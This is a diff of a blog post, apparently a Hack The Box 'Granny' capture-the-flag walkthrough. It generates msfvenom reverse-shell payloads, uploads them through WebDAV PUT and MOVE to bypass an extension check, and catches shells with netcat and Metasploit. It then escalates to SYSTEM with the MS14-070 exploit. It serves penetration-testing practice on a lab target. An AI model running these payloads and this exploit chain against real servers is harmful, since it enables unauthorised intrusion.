@@ -27,8 +27,7 @@ Spending time with Granny this time.  But we are going to use a different exploi
 
 Always start off with a nmap scan to determine the ports open.
 
-{% raw %}
-```sh
+{% capture nmap %}
 ┌──(kali㉿kali)-[~/Documents/htb/granny]
 └─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.10.15   
 [sudo] password for kali: 
@@ -64,14 +63,13 @@ HOP RTT      ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 20.43 seconds
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nmap %}
 
 <br />
 Create an asp payload with msfvenom.
 
-{% raw %}
-```sh
+{% capture genpayload %}
 ┌──(kali㉿kali)-[~/Documents/htb/granny]
 └─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.12 LPORT=443 ExitFunc=thread -f asp -o shell.asp
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -80,16 +78,18 @@ No encoder specified, outputting raw payload
 Payload size: 324 bytes
 Final size of asp file: 38252 bytes
 Saved as: shell.asp
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=genpayload %}
 
 <br />
 Try uploading the file to the webserver since the nmap said that it allowed for PUT requests.
 
-{% raw %}
-```sh
+{% capture uploadattempt %}
 ┌──(kali㉿kali)-[~/Documents/htb/granny]
 └─$ curl http://10.10.10.15/images --upload-file shell.asp
+{% endcapture %}
+
+{% capture uploadattemptresponse %}
 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
 <HTML><HEAD><TITLE>The page cannot be displayed</TITLE>
 <META HTTP-EQUIV="Content-Type" Content="text/html; charset=Windows-1252">
@@ -120,35 +120,35 @@ The page you are looking for cannot be displayed because an invalid method (HTTP
 </ul>
 
 </TD></TR></TABLE></BODY></HTML>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=uploadattempt %}
+
+{% include terminal.html language='browser' title='http://10.10.10.15/images' content=uploadattemptresponse %}
 
 <br />
 Perhaps, there is an extension check preventing the upload.  Let's test this.  Change the extension to txt.
 
-{% raw %}
-```sh
+{% capture changeext %}
 ┌──(kali㉿kali)-[~/Documents/htb/granny]
 └─$ cp shell.asp shell.txt
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=changeext %}
 
 <br />
 Start a netcat listener.
 
-{% raw %}
-```sh
+{% capture startlistener %}
 ┌──(kali㉿kali)-[~/Documents/htb/granny]
 └─$ sudo nc -nlvp 443                              
 listening on [any] 443 ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=startlistener %}
 
 <br />
 Try using cadever to upload the file to the webserver.  Then use the MOVE command to change the extension back to .asp.  Finally, use curl to execute the payload.
 
-{% raw %}
-```sh
+{% capture cadaver %}
 ┌──(kali㉿kali)-[~/Documents/htb/granny]
 └─$ cadaver http://10.10.10.15                     
 dav:/> put shell.txt
@@ -160,39 +160,41 @@ Could not parse response: XML parse error at line 1: Extra content at the end of
 
 ┌──(kali㉿kali)-[~/Documents/htb/granny]
 └─$ curl http://10.10.10.15/shell.asp
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=cadaver %}
 
 <br />
 Check the listener and catch the shell.
 
-{% raw %}
-```sh
+{% capture catchshell %}
 ┌──(kali㉿kali)-[~/Documents/htb/granny]
 └─$ sudo nc -nlvp 443                              
 listening on [any] 443 ...
 connect to [10.10.16.12] from (UNKNOWN) [10.10.10.15] 1030
+{% endcapture %}
+
+{% capture windowsshell %}
 Microsoft Windows [Version 5.2.3790]
 (C) Copyright 1985-2003 Microsoft Corp.
 
 c:\windows\system32\inetsrv>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=catchshell %}
+
+{% include terminal.html language='cmd' title='cmd.exe' content=windowsshell %}
 
 <br />
 Now...it was at this point that I was struggling with the compiled privelege escalation exploit.  It kept freezing my shell.  So, I decided to pivot to Meterpreter.  But I cut the struggle out for cleanliness.
 
-{% raw %}
-```sh
-https://github.com/erwinwildenburg/Offsec/blob/master/Exploits/Windows/Privilege%20Escalation/MS14-070.c
-```
-{% endraw %}
+<div class="info-box">
+  https://github.com/erwinwildenburg/Offsec/blob/master/Exploits/Windows/Privilege%20Escalation/MS14-070.c
+</div>
 
 <br />
 Use msfvenom to generate a new payload in asp format and with the txt extension.
 
-{% raw %}
-```sh
+{% capture genspecial %}
 ┌──(kali㉿kali)-[~/Documents/htb/granny]
 └─$  msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.12 LPORT=443 -f asp -o special.txt       
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -201,14 +203,13 @@ No encoder specified, outputting raw payload
 Payload size: 354 bytes
 Final size of asp file: 38316 bytes
 Saved as: special.txt
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=genspecial %}
 
 <br />
 Start the a multi handler in msfconsole.
 
-{% raw %}
-```sh
+{% capture startmulti %}
 ┌──(kali㉿kali)-[~/Documents/htb/granny]
 └─$ msfconsole -q
 msf6 > use exploit/multi/handler
@@ -242,14 +243,13 @@ lport => 443
 msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
 payload => windows/meterpreter/reverse_tcp
 msf6 exploit(multi/handler) >
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=startmulti%}
 
 <br />
 Use cadaver to PUT the file and MOVE the file exactly like we did before.
 
-{% raw %}
-```sh
+{% capture putspecial %}
 ┌──(kali㉿kali)-[~/Documents/htb/granny]
 └─$ cadaver http://10.10.10.15       
 dav:/> put special.txt
@@ -260,38 +260,35 @@ Moving `/special.txt' to `/special.asp': failed:
 Could not parse response: XML parse error at line 1: Extra content at the end of the document
 
 dav:/>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=putspecial %}
 
 <br />
 Curl the uploaded file.
 
-{% raw %}
-```sh
+{% capture curlasp %}
 ┌──(kali㉿kali)-[~/Documents/htb/granny]
 └─$ curl http://10.10.10.15/special.asp  
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=curlasp %}
 
 <br />
 Check the multi/handler and catch the meterpreter session.
 
-{% raw %}
-```sh
+{% capture catchmeter %}
 msf6 exploit(multi/handler) > exploit
 [*] Started reverse TCP handler on 10.10.16.12:443 
 [*] Sending stage (177734 bytes) to 10.10.10.15
 [*] Meterpreter session 1 opened (10.10.16.12:443 -> 10.10.10.15:1041) at 2025-01-30 02:04:26 +1100
 
 meterpreter >
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=catchmeter %}
 
 <br />
 Run ps to get a list of the processes and migrate to a process that is owned by Networ Service user.
 
-{% raw %}
-```sh
+{% capture processlist %}
 meterpreter > ps
 
 Process List
@@ -343,14 +340,13 @@ Process List
 meterpreter > migrate 2112
 [*] Migrating from 2376 to 2112...
 [*] Migration completed successfully.
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=processlist %}
 
 <br />
 Background the session and search for the local_exploit_suggester.  Set the session with the session number from before.  Run the exploit.
 
-{% raw %}
-```sh
+{% capture backgroundsess %}
 meterpreter > 
 Background session 1? [y/N]  y
 [-] Unknown command: y. Run the help command for more details.
@@ -402,14 +398,13 @@ msf6 post(multi/recon/local_exploit_suggester) > exploit
  4   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
  5   exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
  6   exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=backgroundsess %}
 
 <br />
 Choose the ms14_070_tcpip_ioctl exploit.  Set the session to the meterpreter session that we backgrounded.  Set the LHOST option to the IP address of the tun0 interface.
 
-{% raw %}
-```sh
+{% capture chooseioctl %}
 msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms14_070_tcpip_ioctl
 [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
 msf6 exploit(windows/local/ms14_070_tcpip_ioctl) > show options
@@ -454,14 +449,13 @@ msf6 exploit(windows/local/ms14_070_tcpip_ioctl) > exploit
 [+] Exploitation successful!
 [*] Sending stage (177734 bytes) to 10.10.10.15
 [*] Meterpreter session 2 opened (10.10.16.12:4444 -> 10.10.10.15:1042) at 2025-01-30 02:14:08 +1100
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=chooseioctl %}
 
 <br />
 Get the user.txt flag.
 
-{% raw %}
-```sh
+{% capture userflag %}
 C:\Documents and Settings\Lakis\Desktop>type user.txt
 type user.txt
 <redacted>
@@ -477,14 +471,13 @@ Ethernet adapter Local Area Connection:
    IP Address. . . . . . . . . . . . : 10.10.10.15
    Subnet Mask . . . . . . . . . . . : 255.255.255.0
    Default Gateway . . . . . . . . . : 10.10.10.2
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=userflag %}
 
 <br />
 Get the root.txt flag.
 
-{% raw %}
-```sh
+{% capture rootflag %}
 C:\Documents and Settings\Administrator\Desktop>type root.txt
 type root.txt
 <redacted>
@@ -500,8 +493,8 @@ Ethernet adapter Local Area Connection:
    IP Address. . . . . . . . . . . . : 10.10.10.15
    Subnet Mask . . . . . . . . . . . : 255.255.255.0
    Default Gateway . . . . . . . . . : 10.10.10.2
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=rootflag %}
 
 <br />
 And with that, wrapped up Granny.  See you in the next one.
